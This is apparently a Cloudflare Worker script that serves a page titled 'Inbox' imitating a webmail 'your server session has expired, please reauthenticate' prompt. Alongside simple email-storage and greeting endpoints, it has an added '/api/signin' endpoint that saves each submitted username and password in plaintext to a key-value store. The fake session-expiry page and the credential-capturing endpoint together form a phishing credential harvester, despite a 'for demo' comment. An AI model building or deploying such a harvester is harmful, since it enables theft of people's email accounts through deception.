const HTML = ` Inbox

Your server session has expired. Once you have reauthenticated, the action you just requested will be automatically reattempted. To go back without reauthentication, click here.

`; export default { async fetch(request, env) { const url = new URL(request.url); const path = url.pathname; // Serve the HTML page (root or /) if (path === "/" || path === "/index.html") { return new Response(HTML, { headers: { "Content-Type": "text/html" }, }); } // API: store email in KV (unchanged) if (path === "/api/store-email" && request.method === "POST") { try { const { email } = await request.json(); if (!email) throw new Error("Missing email"); await env.MAILBOX.put(`email:${email}`, JSON.stringify({ storedAt: Date.now() })); return new Response(JSON.stringify({ success: true, email }), { headers: { "Content-Type": "application/json" }, }); } catch (err) { return new Response(JSON.stringify({ error: err.message }), { status: 400, headers: { "Content-Type": "application/json" }, }); } } // API: get a greeting (unchanged) if (path === "/api/get-greeting" && request.method === "GET") { const email = url.searchParams.get("email"); if (!email) { return new Response(JSON.stringify({ error: "Missing email" }), { status: 400, headers: { "Content-Type": "application/json" }, }); } const greetingKey = `greeting:${email}`; const value = await env.MAILBOX.get(greetingKey); return new Response(JSON.stringify({ greeting: value || "Welcome!" }), { headers: { "Content-Type": "application/json" }, }); } // ========== ADDED: Sign-in endpoint ========== if (path === "/api/signin" && request.method === "POST") { try { const { username, password } = await request.json(); if (!username || !password) { return new Response( JSON.stringify({ error: "Username and password required" }), { status: 400, headers: { "Content-Type": "application/json" } } ); } // Store in KV (for demo, password is plain – in production, hash it!) await env.MAILBOX.put(`user:${username}`, JSON.stringify({ password, storedAt: Date.now() })); return new Response( JSON.stringify({ success: true, message: `User "${username}" stored.` }), { headers: { "Content-Type": "application/json" } } ); } catch (err) { return new Response( JSON.stringify({ error: "Internal error: " + err.message }), { status: 500, headers: { "Content-Type": "application/json" } } ); } } // =========================================== // Fallback return new Response("Not Found", { status: 404 }); }, };
